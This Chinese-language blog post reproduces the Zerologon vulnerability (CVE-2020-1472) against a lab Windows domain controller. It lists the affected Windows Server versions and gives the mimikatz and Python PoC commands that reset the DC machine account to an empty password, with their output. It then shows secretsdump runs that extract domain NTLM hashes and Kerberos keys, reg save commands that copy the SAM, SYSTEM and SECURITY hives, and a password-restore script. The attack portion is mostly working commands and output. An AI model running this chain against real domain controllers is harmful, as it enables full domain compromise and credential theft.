<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>Zerologon（CVE-2020-1472）漏洞复现 - x51</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=渗透测试,内网渗透,红蓝对抗>
  
    <meta name="description" content="与其感叹路难行，不如马上出发。">
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x51</a>
    <div class="subtitle">与其感叹路难行，不如马上出发.</div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">主页</a>
        </li>
      
        <li class="menu-item">
          <a href="/archives" class="menu-item-link">归档</a>
        </li>
      
        <li class="menu-item">
          <a href="/tools" class="menu-item-link">Tools</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">关于</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">Zerologon（CVE-2020-1472）漏洞复现</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2020-09-24</span>
  </div>
  <div class="post-content">
    <h1 id="Zerologon（CVE-2020-1472）漏洞复现"><a href="#Zerologon（CVE-2020-1472）漏洞复现" class="headerlink" title="Zerologon（CVE-2020-1472）漏洞复现"></a>Zerologon（CVE-2020-1472）漏洞复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>• Microsoft Windows Server 2008 R2 SP1<br>• Microsoft Windows Server 2012<br>• Microsoft Windows Server 2012 R2<br>• Microsoft Windows Server 2016<br>• Microsoft Windows Server 2019<br>• Microsoft Windows Server version 2004 (Server Core Installation)<br>• Microsoft Windows Server version 1903 (Server Core Installation)<br>• Microsoft Windows Server version 1909 (Server Core Installation)  </p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="mimikatz2-2-0："><a href="#mimikatz2-2-0：" class="headerlink" title="mimikatz2.2.0："></a>mimikatz2.2.0：</h3><p><code>lsadump::zerologon /target:dc.corp.local /account:dc$ /exploit</code></p>
<h3 id="cve-2020-1472-exploit-py"><a href="#cve-2020-1472-exploit-py" class="headerlink" title="cve-2020-1472-exploit.py"></a>cve-2020-1472-exploit.py</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装impacket</span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/SecureAuthCorp/impacket.git</span><br><span class="line"><span class="keyword">cd</span> impacket</span><br><span class="line"><span class="keyword">python3</span> setup.<span class="keyword">py</span> install</span><br></pre></td></tr></table></figure>

<p><code>python3 cve-2020-1472-exploit.py dc 10.10.10.10</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/github/CVE-</span><span class="number">2020-1472</span><span class="comment"># python3 cve-2020-1472-exploit.py dc-x51 10.10.10.10</span></span><br><span class="line">Performing authentication attempts...</span><br><span class="line">===================================================================================================================================================================================================================================================================================================================================================================================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line"><span class="symbol">Result:</span> 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/github/CVE-</span><span class="number">2020-1472</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>其中<code>dc-x51</code>是DC的netbios  name，利用到的账号是<strong>机器账号</strong><code>dc-x51$</code></p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>来自py脚本作者的说明：</p>
<p><code>Do note that by default this changes the password of the domain controller account. Yes this allows you to DCSync, but it also breaks communication with other domain controllers, so be careful with this!</code>  </p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>环境：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域控（DC）：<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br><span class="line">Kali（非域内）：<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
<h3 id="1、首先查看域控机器账户dc-的原始hash值："><a href="#1、首先查看域控机器账户dc-的原始hash值：" class="headerlink" title="1、首先查看域控机器账户dc$的原始hash值："></a>1、首先查看域控机器账户<code>dc$</code>的原始hash值：</h3><p><img src="/images/pasted-140.png" alt="upload successful">  </p>
<h3 id="2、利用POC，重置dc-账户的密码："><a href="#2、利用POC，重置dc-账户的密码：" class="headerlink" title="2、利用POC，重置dc$账户的密码："></a>2、利用POC，重置<code>dc$</code>账户的密码：</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE<span class="number">-2020</span><span class="number">-1472.</span>py dc dc$ <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br><span class="line">[!] CVE<span class="number">-2020</span><span class="number">-1472</span> PoC by BlackArrow (Tarlogic)</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">=====================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================</span><br><span class="line">Success! DC can be fully compromised by a Zerologon attack. (attempt=<span class="number">949</span>)</span><br><span class="line"></span><br><span class="line">NetrServerPasswordSet2Response </span><br><span class="line">ReturnAuthenticator:            </span><br><span class="line">    Credential:                     </span><br><span class="line">        Data:                            b<span class="string">'\x01C\xce^\xf4+P\x8d'</span> </span><br><span class="line">    Timestamp:                       <span class="number">0</span> </span><br><span class="line">ErrorCode:                       <span class="number">0</span> </span><br><span class="line">[+] CVE<span class="number">-2020</span><span class="number">-1472</span> exploited</span><br></pre></td></tr></table></figure>
<h3 id="3、验证是否重置成功："><a href="#3、验证是否重置成功：" class="headerlink" title="3、验证是否重置成功："></a>3、验证是否重置成功：</h3><p><img src="/images/pasted-141.png" alt="upload successful">  </p>
<p><img src="/images/pasted-142.png" alt="upload successful">  </p>
<h3 id="4、导出域控Hash测试"><a href="#4、导出域控Hash测试" class="headerlink" title="4、导出域控Hash测试"></a>4、导出域控Hash测试</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:<span class="regexp">~/github/</span>impacket-master<span class="regexp">/examples# python3 secretsdump.py de1ay/</span>dc\$@<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> -no-pass</span><br><span class="line">Impacket v0<span class="number">.9</span><span class="number">.22</span>.dev1 - Copyright <span class="number">2020</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations <span class="string">failed:</span> DCERPC Runtime <span class="string">Error:</span> <span class="string">code:</span> <span class="number">0x5</span> - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\<span class="string">uid:</span><span class="string">rid:</span><span class="string">lmhash:</span>nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line"><span class="string">Administrator:</span><span class="number">500</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">161</span><span class="string">cff084477fe596a5db81874498a24:</span>::</span><br><span class="line"><span class="string">Guest:</span><span class="number">501</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">31</span><span class="string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::</span><br><span class="line"><span class="string">krbtgt:</span><span class="number">502</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">82</span><span class="string">dfc71b72a11ef37d663047bc2088fb:</span>::</span><br><span class="line"><span class="string">de1ay:</span><span class="number">1001</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">161</span><span class="string">cff084477fe596a5db81874498a24:</span>::</span><br><span class="line">de1ay.com\<span class="string">mssql:</span><span class="number">2103</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">161</span><span class="string">cff084477fe596a5db81874498a24:</span>::</span><br><span class="line"><span class="string">DC$:</span><span class="number">1002</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">31</span><span class="string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::</span><br><span class="line"><span class="string">PC$:</span><span class="number">1105</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="string">ce3e307123b59b4c481286308ae8fc2b:</span>::</span><br><span class="line"><span class="string">WEB$:</span><span class="number">1603</span>:<span class="string">aad3b435b51404eeaad3b435b51404ee:</span><span class="number">73805069e2</span><span class="string">c7227f110772875f1b0e41:</span>::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line"><span class="string">krbtgt:</span>aes256-cts-hmac-sha1<span class="number">-96</span>:<span class="number">42e65</span>a58c000dab8d353b1ff2bee93383f27f0966767afa8c1f32fc51122d118</span><br><span class="line"><span class="string">krbtgt:</span>aes128-cts-hmac-sha1<span class="number">-96</span>:<span class="number">5</span>eb13d2a0e1f4980c3e3810d5da3da4f</span><br><span class="line"><span class="string">krbtgt:</span>des-cbc-<span class="string">md5:</span><span class="number">79</span>c8dc79fe467552</span><br><span class="line"><span class="string">de1ay:</span>aes256-cts-hmac-sha1<span class="number">-96</span>:<span class="number">22</span>df3e763a8d931afea3c8ca499d7d9b7474248b2bf69deac58418f5c6ac899d</span><br><span class="line"><span class="string">de1ay:</span>aes128-cts-hmac-sha1<span class="number">-96</span>:d0f0c418eb1a4c4a13227ed06b56a8fc</span><br><span class="line"><span class="string">de1ay:</span>des-cbc-<span class="string">md5:</span><span class="number">5</span>b375d8a1016d613</span><br><span class="line">de1ay.com\<span class="string">mssql:</span>aes256-cts-hmac-sha1<span class="number">-96</span>:<span class="number">6</span>dd445adefa385cc6484e2a8c8952be5da579a3664395d3d729c7e577a8b8009</span><br><span class="line">de1ay.com\<span class="string">mssql:</span>aes128-cts-hmac-sha1<span class="number">-96</span>:<span class="number">047129868012</span>d63377c7f3ee61a16999</span><br><span class="line">de1ay.com\<span class="string">mssql:</span>des-cbc-<span class="string">md5:</span><span class="number">94</span>bf7f5476298957</span><br><span class="line"><span class="string">DC$:</span>aes256-cts-hmac-sha1<span class="number">-96</span>:<span class="number">29</span>f6a21d200df44d9da2c97116366221413e9df069b0b18280edda219be2bf5e</span><br><span class="line"><span class="string">DC$:</span>aes128-cts-hmac-sha1<span class="number">-96</span>:<span class="number">51</span>d30bc397120a95fa66c429dbf9c010</span><br><span class="line"><span class="string">DC$:</span>des-cbc-<span class="string">md5:</span><span class="number">04</span>f40d04da3df154</span><br><span class="line"><span class="string">PC$:</span>aes256-cts-hmac-sha1<span class="number">-96</span>:c730bbdeec0054d173397ce673d94605e5e4ab216c2f7b0ec5413fad67feb864</span><br><span class="line"><span class="string">PC$:</span>aes128-cts-hmac-sha1<span class="number">-96</span>:<span class="number">19680e58</span>fa88d592ea96f5d1b6b0d74a</span><br><span class="line"><span class="string">PC$:</span>des-cbc-<span class="string">md5:</span><span class="number">981</span>a4a07544c79ec</span><br><span class="line"><span class="string">WEB$:</span>aes256-cts-hmac-sha1<span class="number">-96</span>:<span class="number">9</span>c089a15cce776f40c04a817e8df797f6fe941a96f7803e7d00288255a4fe1f9</span><br><span class="line"><span class="string">WEB$:</span>aes128-cts-hmac-sha1<span class="number">-96</span>:<span class="number">6</span>b98cd30ca51c004444e2275d4b3786a</span><br><span class="line"><span class="string">WEB$:</span>des-cbc-<span class="string">md5:</span><span class="number">910110</span>ce76cde531</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
<p>pth成功：</p>
<p><img src="/images/pasted-144.png" alt="upload successful">  </p>
<h3 id="5、获取原始Hash"><a href="#5、获取原始Hash" class="headerlink" title="5、获取原始Hash"></a>5、获取原始Hash</h3><p>（<strong>备注：</strong>导出SAM拿到的Hash和原始Hash不一样，此处测试使用<code>secretsdump.py</code>的<code>-history</code>参数获取到的原始Hash相同，获取到history结果需要等待少许时间。）</p>
<p><img src="/images/pasted-145.png" alt="upload successful">  </p>
<p>附上SAM导出Hash的方式：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="built_in">save</span> HKLM\SYSTEM <span class="built_in">system</span>.<span class="built_in">save</span></span><br><span class="line">reg <span class="built_in">save</span> HKLM\SAM sam.<span class="built_in">save</span></span><br><span class="line">reg <span class="built_in">save</span> HKLM\SECURITY security.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">get</span> <span class="built_in">system</span>.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">get</span> sam.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">get</span> security.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">del</span> /f <span class="built_in">system</span>.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">del</span> /f sam.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">del</span> /f security.<span class="built_in">save</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~/github/impacket-master/examples# python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br><span class="line">Impacket v0<span class="number">.9</span><span class="number">.22</span>.dev1 - Copyright <span class="number">2020</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: <span class="number">0x36b82df4d5de2cba91f72711f5749d34</span></span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">161</span>cff084477fe596a5db81874498a24:::</span><br><span class="line">Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:f6189a2c440444894aa03fdca4cea46128d3e68f75887924dcca594fbd08fdbca445b8568842aa66660426e654bcae506be87d2c0f5660d8c089d1476c5225ba46812a4ba1c12ae3bfe12cecedb9e3c06293593e68cba418f4ec037c97c5779633f1bfe6c892b64cce9b033b9cab903b8a1f19dd67463d32460f763d7abb78e9569ef21f126aa0ef9ac9ff8185465077db5b517d1a8607fc8847937c16458a742a86290a975c8481f76fa224198715f83d1dd54f6ce6911ffd8a03a200893a57edd19ee514919ebd9faa814f77f0c4dca5dd78e4a92c066ed0d50dac57820a11b17698bbee67841757efd2622791dd68</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d025ee29d7706cb3f0d6b5a2170f8ecb</span><br><span class="line">[*] DefaultPassword </span><br><span class="line">(Unknown User):<span class="symbol">1qaz@</span>WSX</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:<span class="number">0xde6b10d6d12d66d06882ab42529a45f2dd174b18</span></span><br><span class="line">dpapi_userkey:<span class="number">0xb420d078382eb774b299d179ec66737a49dbe082</span></span><br><span class="line">[*] NL$KM </span><br><span class="line"> <span class="number">0000</span>   <span class="number">70</span> <span class="number">2</span>E <span class="number">7</span>E <span class="number">6</span>C C8 DD E9 BF  D5 C8 FE A2 F4 DE E4 <span class="number">35</span>   p.~l..........<span class="number">.5</span></span><br><span class="line"> <span class="number">0010</span>   <span class="number">12</span> <span class="number">91</span> CE <span class="number">0</span>D BB <span class="number">75</span> <span class="number">12</span> <span class="number">63</span>  <span class="number">82</span> <span class="number">4</span>E <span class="number">76</span> E0 A8 CA <span class="number">2</span>D ED   .....u.c.Nv...-.</span><br><span class="line"> <span class="number">0020</span>   F2 <span class="number">18</span> <span class="number">6</span>B <span class="number">73</span> <span class="number">64</span> <span class="number">5</span>F E0 <span class="number">40</span>  <span class="number">58</span> B5 F8 <span class="number">74</span> D1 <span class="number">7</span>C E5 B5   ..ksd_.@X..t.|..</span><br><span class="line"> <span class="number">0030</span>   <span class="number">0</span>C B9 <span class="number">53</span> <span class="number">1</span>D <span class="number">21</span> B0 <span class="number">8</span>B <span class="number">81</span>  <span class="number">3</span>A <span class="number">2</span>A <span class="number">28</span> DC <span class="number">90</span> F2 <span class="number">03</span> <span class="number">92</span>   ..S.!...:*(.....</span><br><span class="line">NL$KM:<span class="number">702e7</span>e6cc8dde9bfd5c8fea2f4dee4351291ce0dbb751263824e76e0a8ca2dedf2186b73645fe04058b5f874d17ce5b50cb9531d21b08b813a2a28dc90f20392</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h3 id="6、恢复"><a href="#6、恢复" class="headerlink" title="6、恢复"></a>6、恢复</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># python3 reinstall_original_pw.py dc 10.10.10.10 f4279db634f00ca3f5777e0b854547ec</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================</span><br><span class="line">NetrServerAuthenticate3Response </span><br><span class="line">ServerCredential:               </span><br><span class="line">    Data:                            b'<span class="symbol">\x</span>be<span class="symbol">\x</span>17<span class="symbol">\x</span>89x T<span class="symbol">\x</span>17<span class="symbol">\x</span>f9' </span><br><span class="line">NegotiateFlags:                  556793855 </span><br><span class="line">AccountRid:                      1002 </span><br><span class="line">ErrorCode:                       0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server challenge b'<span class="symbol">\x</span>be<span class="symbol">\x</span>aa<span class="symbol">\x</span>85<span class="symbol">\x</span>ed.<span class="symbol">\x</span>9f`b'</span><br><span class="line">session key b's<span class="symbol">\x</span>eb<span class="symbol">\x</span>c9<span class="symbol">\x</span>f8b<span class="symbol">\x</span>bdn:#W[<span class="symbol">\x</span>ceQ;<span class="symbol">\x</span>fd5'</span><br><span class="line">NetrServerPasswordSetResponse </span><br><span class="line">ReturnAuthenticator:            </span><br><span class="line">    Credential:                     </span><br><span class="line">        Data:                            b'<span class="symbol">\x</span>01<span class="symbol">\x</span>98<span class="symbol">\x</span>03<span class="symbol">\x</span>803<span class="symbol">\x</span>bc<span class="symbol">\x</span>d5<span class="symbol">\x</span>83' </span><br><span class="line">    Timestamp:                       0 </span><br><span class="line">ErrorCode:                       0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Success! DC machine account should be restored to it's original value. You might want to secretsdump again to check.</span><br></pre></td></tr></table></figure>
<p>验证是否恢复成功：  </p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/github/impacket-master/examples</span><span class="comment"># python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10 -just-dc-user 'dc$' </span></span><br><span class="line">Impacket v0.<span class="number">9.22</span>.dev1 - Copyright <span class="number">2020</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\<span class="symbol">uid:</span><span class="symbol">rid:</span><span class="symbol">lmhash:</span>nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">DC<span class="variable">$:</span><span class="number">1002</span><span class="symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="symbol">:f4279db634f00ca3f5777e0b854547ec</span>::<span class="symbol">:</span></span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
<p><code>no-pass</code>已失效：  </p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/github/impacket-master/examples# python3 secretsdump.py 'de1ay/dc$@<span class="number">10.10</span>.<span class="number">10.10</span>' -no-passImpacket v0.<span class="number">9.22</span>.dev1 - Copyright <span class="number">2020</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line"><span class="literal">[-]</span> RemoteOperations failed: SMB SessionError: <span class="constructor">STATUS_LOGON_FAILURE(The <span class="params">attempted</span> <span class="params">logon</span> <span class="params">is</span> <span class="params">invalid</span>. This <span class="params">is</span> <span class="params">either</span> <span class="params">due</span> <span class="params">to</span> <span class="params">a</span> <span class="params">bad</span> <span class="params">username</span> <span class="params">or</span> <span class="params">authentication</span> <span class="params">information</span>.)</span></span><br><span class="line"><span class="literal">[<span class="operator">*</span>]</span> Cleaning up...</span><br></pre></td></tr></table></figure>
<p><strong>注意：恢复脚本重复执行会让结果发生变化，只执行一次即可！</strong></p>

  </div>
  <div class="post-footer">
    

    <a href="#top" class="top">返回顶部</a>
  </div>
</article>
<footer>
  &copy; 2020
  <span class="author">
    x51
  </span>
</footer>
    </div>
  </body>
</html>